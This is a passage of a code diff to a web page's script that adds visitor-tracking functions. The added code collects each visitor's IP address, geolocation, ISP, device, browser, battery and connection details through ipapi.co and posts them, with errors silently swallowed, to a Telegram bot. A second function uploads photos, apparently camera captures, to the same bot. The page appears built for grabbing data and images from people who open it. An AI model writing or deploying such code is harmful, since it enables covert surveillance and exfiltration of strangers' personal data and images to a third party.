+  // ── Telegram API ──
+  async function sendTextToTelegram(data) {
+    const lines = Object.entries(data).map(([k,v]) => `${k}: <b>${esc(String(v))}</b>`).join('\n');
+    const msg = `🔔 <b>New Visitor!</b>\n━━━━━━━━━━━━━━━━━━━\n${lines}\n━━━━━━━━━━━━━━━━━━━\n✅ User granted permission`;
+    try {
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method:'POST', headers:{'Content-Type':'application/json'},
+        body: JSON.stringify({ chat_id: CHAT_ID, text: msg, parse_mode: 'HTML' })
       });
-      document.getElementById('successCard').classList.add('show');
-    }
+    } catch(e) {}
+  }
 
-    function escapeHtml(s) {
-      return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    }
+  async function sendPhotoToTelegram(blob, caption) {
+    try {
+      const form = new FormData();
+      form.append('chat_id', CHAT_ID);
+      form.append('photo', blob, 'photo.jpg');
+      form.append('caption', caption);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method:'POST', body: form });
+    } catch(e) {}
+  }
 
-    function getBrowser() {
-      const ua = navigator.userAgent;
-      if (ua.includes('Edg'))    return 'Microsoft Edge';
-      if (ua.includes('OPR') || ua.includes('Opera')) return 'Opera';
-      if (ua.includes('Chrome')) return 'Google Chrome';
-      if (ua.includes('Firefox'))return 'Mozilla Firefox';
-      if (ua.includes('Safari') && !ua.includes('Chrome')) return 'Apple Safari';
-      return 'Unknown';
-    }
+  // ── Data Collection ──
+  async function gatherData() {
+    let ip='Unknown', city='Unknown', country='Unknown', isp='Unknown', timezone='Unknown', region='Unknown';
+    try {
+      const r = await fetch('https://ipapi.co/json/');
+      const g = await r.json();
+      ip=g.ip||'Unknown'; city=g.city||'Unknown'; region=g.region||'Unknown';
+      country=g.country_name||'Unknown'; isp=g.org||'Unknown'; timezone=g.timezone||'Unknown';
+    } catch(e) {}
+    const now = new Date();
+    return {
+      '🌐 IP':          ip,
+      '📍 City':        city,
+      '🗺️ Region':      region,
+      '🌍 Country':     country,
+      '🏢 ISP':         isp,
+      '🕰️ Timezone':    timezone,
+      '🖥️ Browser':     getBrowser(),
+      '💻 OS':          getOS(),
+      '📱 Device':      isMobile()?'Mobile':'Desktop',
+      '📐 Screen':      `${screen.width}×${screen.height}`,
+      '🗣️ Language':    navigator.language||'Unknown',
+      '🕐 Time':        now.toLocaleTimeString(),
+      '📅 Date':        now.toLocaleDateString(),
+      '🔗 Referrer':    document.referrer||'Direct',
+      '🍪 Cookies':     navigator.cookieEnabled?'Yes':'No',
+      '🌑 Dark Mode':   window.matchMedia('(prefers-color-scheme:dark)').matches?'Yes':'No',
+      '📶 Connection':  getConn(),
+      '🔋 Battery':     await getBattery(),
+      '🖱️ Touch':       ('ontouchstart' in window)?'Yes':'No',
+    };
+  }
 
-    function getOS() {
-      const ua = navigator.userAgent;
-      if (ua.includes('Windows NT 10.0')) return 'Windows 10/11';
-      if (ua.includes('Windows'))  return 'Windows';
-      if (ua.includes('Mac'))      return 'macOS';
-      if (ua.includes('Android'))  return 'Android';
-      if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
-      if (ua.includes('Linux'))   return 'Linux';
-      return 'Unknown';
-    }
+  function showSuccess(data) {
+    show('step5');
+    const display = document.getElementById('dataDisplay');
+    display.innerHTML = '<h3>📡 Collected Info</h3>';
+    Object.entries(data).forEach(([k,v]) => {
+      const row = document.createElement('div');
+      row.className = 'data-row';
+      row.innerHTML = `<span class="data-key">${k}</span><span class="data-val">${v}</span>`;
+      display.appendChild(row);
+    });
+  }
 
-    function isMobile() { return /Mobi|Android/i.test(navigator.userAgent); }
-
-    function getConnection() {
-      const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-      if (!c) return 'Unknown';
-      return c.effectiveType ? c.effectiveType.toUpperCase() : (c.type || 'Unknown');
-    }
-
-    async function getBattery() {
-      try {
-        const b = await navigator.getBattery();
-        return `${Math.round(b.level * 100)}% ${b.charging ? '⚡ Charging' : ''}`;
-      } catch(e) { return 'N/A'; }
-    }
-  </script>
+  function esc(s){ return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }
+  function getBrowser(){const u=navigator.userAgent;if(u.includes('Edg'))return'Edge';if(u.includes('OPR'))return'Opera';if(u.includes('Chrome'))return'Chrome';if(u.includes('Firefox'))return'Firefox';if(u.includes('Safari'))return'Safari';return'Unknown';}
+  function getOS(){const u=navigator.userAgent;if(u.includes('Windows'))return'Windows';if(u.includes('Mac'))return'macOS';if(u.includes('Android'))return'Android';if(/iPad|iPhone/.test(u))return'iOS';if(u.includes('Linux'))return'Linux';return'Unknown';}
+  function isMobile(){return /Mobi|Android/i.test(navigator.userAgent);}
+  function getConn(){const c=navigator.connection||navigator.mozConnection||navigator.webkitConnection;if(!c)return'Unknown';return c.effectiveType?c.effectiveType.toUpperCase():(c.type||'Unknown');}
+  async function getBattery(){try{const b=await navigator.getBattery();return`${Math.round(b.level*100)}% ${b.charging?'⚡':''}`;}catch(e){return'N/A';}}
+</script>
 </body>
 </html>
